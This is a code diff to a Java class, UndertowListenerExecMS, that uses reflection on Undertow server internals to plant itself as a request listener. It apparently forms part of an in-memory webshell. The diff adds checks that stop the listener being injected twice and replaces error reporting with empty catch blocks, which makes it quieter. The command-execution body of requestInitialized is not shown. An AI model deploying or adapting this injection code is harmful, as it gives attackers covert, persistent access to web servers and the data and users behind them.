@@ -6,6 +6,7 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.InputStream;
 import java.lang.reflect.Field;
+import java.util.ArrayList;
 import java.util.Map;
 
 /**
@@ -35,21 +36,52 @@ public class UndertowListenerExecMS implements ServletRequestListener {
 
                 try {
                     if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
-                        Class listenerInfoClass = Class.forName("io.undertow.servlet.api.ListenerInfo");
-                        Object deployment = getFieldValue(value, "deployment");
-                        Object applicationListeners = getFieldValue(deployment, "applicationListeners");
-                        Object managedListener = Class.forName("io.undertow.servlet.core.ManagedListener").getConstructor(listenerInfoClass, Boolean.TYPE).newInstance(listenerInfoClass.getConstructor(Class.class).newInstance(undertowListenerExecMS.getClass()), true);
-                        applicationListeners.getClass().getDeclaredMethod("addListener", Class.forName("io.undertow.servlet.core.ManagedListener")).invoke(applicationListeners, managedListener);
-                        break;
+                        if (isInject(value, undertowListenerExecMS)) {
+                            break;
+                        }
+                        inject(value, undertowListenerExecMS);
                     }
                 } catch (Exception e) {
-                    e.printStackTrace();
+
                 }
             }
+        } catch (Exception e) {
+
+        }
+    }
+
+    public static boolean isInject(Object servletRequestContext, Object object) {
+        try {
+            Object deployment = getFieldValue(servletRequestContext, "deployment");
+            Object applicationListeners = getFieldValue(deployment, "applicationListeners");
+            ArrayList allListeners = (ArrayList) getFieldValue(applicationListeners, "allListeners");
+            for (int i = 0; i < allListeners.size(); i++) {
+                Object listener = allListeners.get(i);
+                Object listenerInfo = getFieldValue(listener, "listenerInfo");
+                Object listenerClass = getFieldValue(listenerInfo, "listenerClass");
+                String name = (String) getFieldValue(listenerClass, "name");
+                if (name != null && name.contains(object.getClass().getName())) {
+                    return true;
+                }
+            }
+        } catch (Exception e) {
+            
+        }
+        return false;
+    }
+
+    public static void inject(Object servletRequestContext, Object object) {
+        try {
+            Object deployment = getFieldValue(servletRequestContext, "deployment");
+            Object applicationListeners = getFieldValue(deployment, "applicationListeners");
+            Object ListenerInfo = Class.forName("io.undertow.servlet.api.ListenerInfo").getConstructor(Class.class).newInstance(object.getClass());
+            Object managedListener = Class.forName("io.undertow.servlet.core.ManagedListener").getConstructor(Class.forName("io.undertow.servlet.api.ListenerInfo"), Boolean.TYPE).newInstance(ListenerInfo, true);
+            applicationListeners.getClass().getDeclaredMethod("addListener", Class.forName("io.undertow.servlet.core.ManagedListener")).invoke(applicationListeners, managedListener);
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
+
 
     public void requestInitialized(ServletRequestEvent sre) {
         try {
